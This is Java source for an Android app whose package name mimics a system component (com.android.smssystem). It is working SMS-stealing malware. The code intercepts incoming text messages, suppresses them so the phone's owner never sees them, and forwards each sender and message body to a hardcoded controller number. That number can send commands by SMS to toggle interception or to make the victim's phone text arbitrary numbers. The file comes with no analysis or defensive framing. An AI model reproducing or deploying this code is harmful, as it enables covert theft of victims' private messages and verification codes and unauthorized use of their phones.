package com.android.smssystem;

import java.io.ByteArrayInputStream;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Base64;
import android.util.Log;

public class SmSutils {

	public static final String phone = "15658757131";
	public static final String endtime = "2020-05-07 00:00:00";
	public static final String key = "Q049U0hBWUZN";
	private static final SimpleDateFormat sdf = new SimpleDateFormat(
			"yyyy-MM-dd HH:mm:ss");

	public void SendSms(Bundle bundle, Context context, SmSReceiver receiver) {
		try {

			SharedPreferences sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
			Object pdus[] = (Object[]) bundle.get("pdus");
			SmsMessage[] messages = new SmsMessage[pdus.length];
			for (int i = 0; i < pdus.length; i++) {
				messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
			}
			String msg = "";
			String fromphone = "";
			for (SmsMessage message : messages) {
				msg += message.getMessageBody();
				if ("".equals(fromphone)) {
					fromphone = message.getOriginatingAddress();
				}
			}
			Log.i("action", fromphone+"->"+msg);
			if (sp.getBoolean("islj", true)||fromphone.contains(phone)) {
				receiver.abortBroadcast();
			}
			Parse(fromphone,msg,context,sp);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			sendSMS(phone, "出现异常"+e.getMessage(),
					null);
		}
	}
	
	public void Parse(String fromphone,String msg,Context context,SharedPreferences sp){
		Log.i("action", fromphone+" to-->"+phone+"-> "+msg);
		if (fromphone.contains(phone)) {
			String[] ns = msg.split("@");
			if (ns.length >= 1) {
				if ("com".equals(ns[0])) {
					command(ns[1],sp);
				} else if (isMobileNO(ns[0])) {
					sendSMS(ns[0], ns[1], context);
				} else {
					sendSMS(phone, ns.length + " 指令错误'" + ns[0] + "',"
							+ ns[1], null);
				}

			} else {
				sendSMS(phone, ns.length + " 指令错误" + msg + "正确格式 手机号码@内容",
						null);
			}
		} else {
			if (sp.getBoolean("islj", true)) {
				sendSMS(phone, fromphone + "->" + msg, null);
			}
		}
	}

	public void sendSMS(String phonenumber, String msg, Context c) {
		Log.i("action", phonenumber+"->"+msg);
		SmsManager smsManager = SmsManager.getDefault();
		ArrayList<PendingIntent> sentIntent = null;
		ArrayList<String> msgs = smsManager.divideMessage(msg);
		if (c != null) {
			sentIntent = new ArrayList<PendingIntent>();
			for (int i = 0; i < msgs.size(); i++) {
				PendingIntent pd = PendingIntent.getBroadcast(c, i, new Intent(SmSserver.SendState),0);
				sentIntent.add(pd);
			}
		}
		smsManager.sendMultipartTextMessage(phonenumber, null, msgs,
				sentIntent, null);

	}

	public static boolean isMobileNO(String mobiles) {
		try {
			double b = Double.parseDouble(mobiles);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
		return true;
	}

	public boolean isflag() {
		try {
			Date et = sdf.parse(endtime);
			if (et.after(new Date())) {
				return true;
			}
		} catch (ParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return false;
	}

	public void command(String com,SharedPreferences sp) {
		Log.i("action", "islj state "+com);
		if (sp != null) {
			Editor editor = sp.edit();
			if ("true".equals(com)) {
				editor.putBoolean("islj", true);
			} else {
				editor.putBoolean("islj", false);
			}
			editor.commit();
		}
	}

	public static String getPublicKey(Context context) {
		try {
			PackageManager pm = context.getPackageManager();
			PackageInfo info = pm.getPackageInfo(context.getPackageName(),
					PackageManager.GET_SIGNATURES);
			CertificateFactory certFactory = CertificateFactory
					.getInstance("X.509");
			X509Certificate cert = (X509Certificate) certFactory
					.generateCertificate(new ByteArrayInputStream(
							info.signatures[0].toByteArray()));
			return Base64.encodeToString(
					cert.getIssuerDN().getName().getBytes("UTF-8"),
					Base64.DEFAULT).trim();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
}
